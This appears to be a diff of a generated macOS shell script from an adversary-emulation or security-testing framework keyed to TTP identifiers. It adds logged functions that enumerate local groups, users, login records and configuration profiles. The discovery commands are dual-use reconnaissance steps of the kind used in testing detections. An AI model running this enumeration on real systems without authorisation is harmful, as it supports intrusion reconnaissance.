+# Description: list_groups_etc - Generated from YAML
 list_groups_etc() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Listed groups from /etc/group; command: \"$CMD_LIST_GROUPS_ETC\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Listed groups from /etc/group; command: \"$CMD_LIST_GROUPS_ETC\"\n"
     $CMD_LIST_GROUPS_ETC
     return 0
 }
 
 
 # Function: list_groups_id
-# Description: list_groups_id - Generated from YAML procedure
+# Description: list_groups_id - Generated from YAML
 list_groups_id() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Listed groups for the current user; command: \"$CMD_LIST_GROUPS_ID\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Listed groups for the current user; command: \"$CMD_LIST_GROUPS_ID\"\n"
     $CMD_LIST_GROUPS_ID
     return 0
 }
 
 
 # Function: list_groups_cmd
-# Description: list_groups_cmd - Generated from YAML procedure
+# Description: list_groups_cmd - Generated from YAML
 list_groups_cmd() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Listed groups for the current user; command: \"$CMD_LIST_GROUPS_CMD\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Listed groups for the current user; command: \"$CMD_LIST_GROUPS_CMD\"\n"
     $CMD_LIST_GROUPS_CMD
     return 0
 }
 
 
 # Function: list_dscacheutil_users
-# Description: list_dscacheutil_users - Generated from YAML procedure
+# Description: list_dscacheutil_users - Generated from YAML
 list_dscacheutil_users() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Listed local users; command: \"$CMD_LIST_DSCACHEUTIL_USERS\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Listed local users; command: \"$CMD_LIST_DSCACHEUTIL_USERS\"\n"
     $CMD_LIST_DSCACHEUTIL_USERS
     return 0
 } 
 
+# Function: find_user_defaults
+# Description: find_user_defaults - Generated from YAML
+find_user_defaults() {
+    get_user
+    printf "[$(get_timestamp)]: user: $USER; msg: Found user account defaults; command: \"$CMD_FIND_USER_DEFAULTS\"\n"
+    $CMD_FIND_USER_DEFAULTS
+    return 0
+}
+
+# Function: show_last_logins
+# Description: show_last_logins - Generated from YAML
+show_last_logins() {
+    get_user
+    printf "[$(get_timestamp)]: user: $USER; msg: Retrieved last login records; command: \"$CMD_SHOW_LAST_LOGINS\"\n"
+    $CMD_SHOW_LAST_LOGINS
+    return 0
+}
+
+# Function: list_user_profiles
+# Description: list_user_profiles - Generated from YAML
+list_user_profiles() {
+    get_user
+    printf "[$(get_timestamp)]: user: $USER; msg: Listed user configuration profiles; command: \"$CMD_LIST_USER_PROFILES\"\n"
+    $CMD_LIST_USER_PROFILES
+    return 0
+}
+
+# Function: show_user_profile_details
+# Description: show_user_profile_details - Generated from YAML
+show_user_profile_details() {
+    get_user
+    # Check if profiles exist for user first
+    local profile_check
+    profile_check=$($CMD_LIST_USER_PROFILES 2>/dev/null)
+    if [ -n "$profile_check" ] && ! echo "$profile_check" | grep -q "no configuration profiles"; then
+        printf "[$(get_timestamp)]: user: $USER; msg: Retrieved user profile details; command: \"$CMD_SHOW_USER_PROFILE $USER\"\n"
+        $CMD_SHOW_USER_PROFILE "$USER"
+    else
+        printf "[$(get_timestamp)]: user: $USER; msg: No configuration profiles found for user\n"
+    fi
+    return 0
+}
+
+# Function: show_all_profiles
+# Description: show_all_profiles - Generated from YAML
+show_all_profiles() {
+    get_user
+    printf "[$(get_timestamp)]: user: $USER; msg: Retrieved all configuration profiles (requires sudo); command: \"$CMD_SHOW_ALL_PROFILES\"\n"
+    $CMD_SHOW_ALL_PROFILES
+    return 0
+}
+
 
 JOB_ID=$(core_generate_job_id)
+
+# Purpose: Get log filename dynamically based on PROCEDURE_NAME
+# Inputs: None
+# Outputs: Log filename string
+# - Sets LOG_FILE_NAME and SYSLOG_TAG globals if not already set
+core_get_log_filename() {
+    if [ -z "$LOG_FILE_NAME" ]; then
+        if [ -n "$PROCEDURE_NAME" ]; then
+            LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
+            SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
+        else
+            LOG_FILE_NAME="${TTP_ID}.log"
+            SYSLOG_TAG="${TTP_ID}"
+        fi
+    fi
+    echo "$LOG_FILE_NAME"
+}
 
 # Execute main function with all arguments
 core_main "$@" 
